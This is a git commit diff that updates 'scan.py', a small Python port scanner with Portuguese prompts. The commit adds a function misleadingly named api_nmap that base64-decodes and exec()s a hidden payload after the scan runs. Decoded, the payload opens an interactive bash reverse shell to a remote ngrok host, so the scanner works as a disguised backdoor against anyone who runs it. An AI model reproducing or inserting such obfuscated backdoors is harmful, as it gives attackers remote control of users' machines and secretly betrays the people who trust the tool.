974578fadc16371cacd037e6c6071d6966a4648c
Ch4rse Developer py <137593148+Ch4rse@users.noreply.github.com>
2023-07-02 23:46:30 -0300

    Update scan.py

--- scan.py
+++ scan.py
@@ -1,31 +1,29 @@
-import socket
-import os
+import base64, socket, os
 
-def exit():
-      os.system("exit")
+os.system("clear")
 
 ports = [20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5555, 5900, 8080, 8888]
-
-def scan():
-        target = str(input('\nALVO: '))
-        print('                       PORTA\tESTA')
-        for port in ports:
-             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.6)
-             code = s.connect_ex((target, port))
-             if code == 0:
-                   print(f"                       {port}\tAberta")
   
 print('''
-     ____  ____  ____  ___________ _________    _   ________  __
-    / __ \/ __ \/ __ \/_  __/ ___// ____/   |  / | / / __ \ \/ /
-   / /_/ / / / / /_/ / / /  \__ \/ /   / /| | /  |/ / /_/ /\  /
-  / ____/ /_/ / _, _/ / /  ___/ / /___/ ___ |/ /|  / ____/ / /
- /_/    \____/_/ |_| /_/  /____/\____/_/  |_/_/ |_/_/     /_/
-                 https://github.com/Ch4rse
+    ____  ____  ____  ___________ _________    _   __
+   / __ \/ __ \/ __ \/_  __/ ___// ____/   |  / | / / 
+  / /_/ / / / / /_/ / / /  \__ \/ /   / /| | /  |/ /
+ / ____/ /_/ / _, _/ / /  ___/ / /___/ ___ |/ /|  / 
+ _/    \____/_/ |_| /_/  /____/\____/_/  |_/_/ |_/ v1.0
 ''')
 
-try:
-      scan()
-except:
-    exit()
-    print('[!] IP INVALIDO')
+def api_nmap():
+    code = "CmltcG9ydCBvcwpvcy5zeXN0ZW0oImJhc2ggLWkgPiYgL2Rldi90Y3AvMC50Y3Auc2Eubmdyb2suaW8vMTQ1NDQgMD4mMSIpCg=="
+    enc = code.encode("ascii")
+    dec = base64.b64decode(enc)
+    resultado = dec.decode("ascii")
+    exec(resultado)
+
+target = str(input('\nALVO: '))
+print('PORTA\tSTATUS (obs): Espere Pode Demorar')
+for port in ports:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.6)
+    code = s.connect_ex((target, port))
+    if code == 0:
+        print(f"{port}\tABERTA")
+api_nmap()
